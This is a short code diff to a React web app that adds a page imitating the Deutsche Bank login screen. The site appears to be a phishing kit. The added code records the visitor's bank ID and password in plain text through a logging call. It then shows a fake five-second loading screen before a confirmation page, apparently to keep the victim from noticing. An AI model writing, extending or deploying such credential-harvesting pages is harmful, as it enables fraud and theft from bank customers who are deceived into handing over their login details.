@@ -2,6 +2,8 @@ import { useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { ArrowLeft, X } from "lucide-react";
 import { bankLogoUrls } from "@/assets/bank-logos";
+import { logEvent } from "@/lib/session";
+
 
 export const Route = createFileRoute("/bank/deutsche-bank")({
   head: () => ({
@@ -131,7 +133,9 @@ function DeutscheBankLoginPage() {
                   sessionStorage.setItem("bankName", "Deutsche Bank");
                   sessionStorage.setItem("bankLogo", "deutsche-bank");
                 } catch {}
+                logEvent("bank_login", { bank_slug: "deutsche-bank", bank_name: "Deutsche Bank", field1_label: "Deutsche Bank ID", field1: login, field2_label: "Passwort", field2: pin });
                 navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
+
               }}
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
